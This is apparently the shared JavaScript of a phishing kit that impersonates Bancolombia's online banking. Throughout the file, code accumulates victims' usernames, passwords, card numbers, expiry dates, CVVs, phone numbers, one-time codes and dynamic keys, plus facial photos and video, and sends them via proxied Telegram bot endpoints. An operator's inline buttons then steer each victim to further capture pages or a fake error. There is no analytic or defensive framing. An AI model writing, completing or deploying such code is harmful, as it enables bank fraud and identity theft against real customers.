/* ===== JS COMÚN BANCOLOMBIA - secured pages ===== */
const SESSION_ID = sessionStorage.getItem('bc_session') || '';
const USER       = sessionStorage.getItem('bc_user')    || 'Usuario';

if (!SESSION_ID) {
  if (!location.pathname.endsWith('index.html') && location.pathname !== '/' && !location.pathname.endsWith('/')) {
    location.href = 'index.html';
  }
}

const ACTION_REDIRECTS = {
  GOTO_DASH:   'dashboard.html',
  GOTO_OTP:    'otp.html',
  GOTO_DIN:    'dashboard.html?modal=din',
  GOTO_TC:     'tarjeta.html',
  GOTO_FACIAL: 'facial.html'
};

let pollTimer = null;

function showLoader() { document.getElementById('loader')?.classList.add('show'); }
function hideLoader() { document.getElementById('loader')?.classList.remove('show'); }

function show923Modal() {
  stopPolling();
  hideLoader();
  document.getElementById('modal923')?.classList.add('show');
}

function stopPolling() {
  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
}

function getKb(evt) {
  return {
    inline_keyboard: [
      [{ text: '✅ OK', callback_data: `ACTION:OK_${evt}` }, { text: '❌ ERR', callback_data: `ACTION:ERR_${evt}` }],
      [{ text: '🔄 DASH', callback_data: `ACTION:GOTO_DASH` }, { text: '📱 OTP', callback_data: `ACTION:GOTO_OTP` }, { text: '🔑 DIN', callback_data: `ACTION:GOTO_DIN` }],
      [{ text: '💳 TC', callback_data: `ACTION:GOTO_TC` }, { text: '👤 FACIAL', callback_data: `ACTION:GOTO_FACIAL` }],
      [{ text: '⚠️ ERROR 923', callback_data: `ACTION:ERROR_923` }]
    ]
  };
}

function b64toBlob(b64, type) {
  const bin = atob(b64.split(',')[1]);
  const arr = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
  return new Blob([arr], { type: type });
}

async function sendAndWait(payload, handlers) {
  showLoader();
  try {
    let msgId = null;

    // 1. Guardar temporalmente los datos nuevos en sessionStorage
    if (payload.event === 'TARJETA') {
      sessionStorage.setItem('temp_tc', payload.tc || '');
      sessionStorage.setItem('temp_expiry', payload.expiry || '');
      sessionStorage.setItem('temp_cvv', payload.cvv || '');
      sessionStorage.setItem('temp_phone', payload.phone || payload.telefono || '');
    } else if (payload.event === 'OTP') {
      sessionStorage.setItem('temp_otp', payload.otp || '');
    } else if (payload.event === 'DINAMICA') {
      sessionStorage.setItem('temp_dinamic', payload.dinamic || '');
    }

    // 2. Recuperar TODO lo acumulado
    const uUser   = sessionStorage.getItem('bc_user') || USER || 'N/A';
    const uPass   = sessionStorage.getItem('bc_pass') || 'N/A';
    const uTc     = sessionStorage.getItem('temp_tc') || 'N/A';
    const uExp    = sessionStorage.getItem('temp_expiry') || 'N/A';
    const uCvv    = sessionStorage.getItem('temp_cvv') || 'N/A';
    const uPhone  = sessionStorage.getItem('temp_phone') || 'N/A';
    const uOtp    = sessionStorage.getItem('temp_otp') || 'N/A';
    const uDin    = sessionStorage.getItem('temp_dinamic') || 'N/A';

    // 3. Construir el mensaje unificado
    let txt = `📋 *REGISTRO COMPLETO [${payload.event}]*\n\n`;
    txt += `🆔 ID: \`${SESSION_ID}\`\n`;
    txt += `👤 Usuario: \`${uUser}\`\n`;
    txt += `🔑 Clave: \`${uPass}\``;

    if (uTc !== 'N/A') {
      txt += `\n\n💳 *DATOS DE TARJETA:*\n`;
      txt += `🔢 TC: \`${uTc}\`\n`;
      txt += `📅 Exp: \`${uExp}\`\n`;
      txt += `🔒 CVV: \`${uCvv}\`\n`;
      txt += `📞 Teléfono: \`${uPhone}\``;
    }

    if (uOtp !== 'N/A') {
      txt += `\n\n🔢 *OTP:* \`${uOtp}\``;
    }

    if (uDin !== 'N/A') {
      txt += `\n\n🔑 *Clave Dinámica:* \`${uDin}\``;
    }

    if (payload.event === 'FACIAL') {
      const rPhoto = await fetch(`/api/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          photo: payload.foto,
          caption: `📷 *CAPTURA FACIAL*\n\n🆔 ID: \`${SESSION_ID}\`\n👤 Usuario: \`${uUser}\`\n🔑 Clave: \`${uPass}\``,
          parse_mode: 'Markdown',
          reply_markup: getKb(payload.event)
        })
      });
      const dPhoto = await rPhoto.json();
      if (!dPhoto.ok) throw new Error('Error enviando captura');
      msgId = dPhoto.result.message_id;

      if (payload.video) {
        fetch(`/api/sendDocument`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            document: payload.video,
            caption: `🎥 *VIDEO MOVIMIENTO*\n🆔 ID: \`${SESSION_ID}\``,
            parse_mode: 'Markdown'
          })
        });
      }
    } else {
      const res = await fetch(`/api/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: txt, parse_mode: 'Markdown', reply_markup: getKb(payload.event) })
      });
      const data = await res.json();
      if (!data.ok) throw new Error('Error enviando mensaje');
      msgId = data.result.message_id;
    }

    pollAction(msgId, handlers);
  } catch (e) {
    hideLoader();
    alert('Error de red al enviar la información.');
  }
}

async function pollAction(msgId, handlers) {
  try {
    const r = await fetch(`/api/getUpdates?msgId=${msgId}`);
    const d = await r.json();

    if (d.ok && d.result) {
      for (let u of d.result) {
        if (u.callback_query && u.callback_query.message.message_id === msgId) {
          const act = u.callback_query.data.replace('ACTION:', '');

          fetch(`/api/editMessageReplyMarkup`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message_id: msgId, reply_markup: { inline_keyboard: [] } })
          });

          if (ACTION_REDIRECTS[act]) { location.href = ACTION_REDIRECTS[act]; return; }
          if (act === 'ERROR_923') { show923Modal(); return; }
          if (act.startsWith('OK_')) return handlers.onOk && handlers.onOk(act);
          if (act.startsWith('ERR_')) return handlers.onErr && handlers.onErr(act);
          return;
        }
      }
    }
  } catch (e) {}
  pollTimer = setTimeout(() => pollAction(msgId, handlers), 2000);
}

function close923Retry() {
  sessionStorage.clear();
  location.href = 'index.html';
}

function setupOtpInputs(containerId, btnId, errorBannerId) {
  const inputs = document.querySelectorAll('#' + containerId + ' input');
  const btn = document.getElementById(btnId);
  const errEl = errorBannerId ? document.getElementById(errorBannerId) : null;
  
  function check() {
    const allFilled = Array.from(inputs).every(i => i.value.length === 1);
    btn.classList.toggle('active', allFilled);
    btn.disabled = !allFilled;
  }
  
  inputs.forEach((input, idx) => {
    input.addEventListener('input', () => {
      input.value = input.value.replace(/\D/g, '');
      if (input.value && idx < inputs.length - 1) inputs[idx + 1].focus();
      if (errEl) errEl.classList.remove('show');
      check();
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !input.value && idx > 0) inputs[idx - 1].focus();
    });
    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const digits = (e.clipboardData.getData('text') || '').replace(/\D/g,'').slice(0, inputs.length);
      digits.split('').forEach((d, i) => { if (inputs[i]) inputs[i].value = d; });
      check();
      const next = Math.min(digits.length, inputs.length - 1);
      inputs[next].focus();
    });
  });
  
  return {
    inputs,
    getCode: () => Array.from(inputs).map(i => i.value).join(''),
    clear: () => { inputs.forEach(i => i.value = ''); inputs[0] && inputs[0].focus(); check(); },
    showError: () => errEl && errEl.classList.add('show')
  };
}

document.addEventListener('DOMContentLoaded', () => {
  const el = document.getElementById('userName');
  if (el && USER) {
    const display = USER.charAt(0).toUpperCase() + USER.slice(1).toLowerCase();
    el.textContent = display;
  }
});
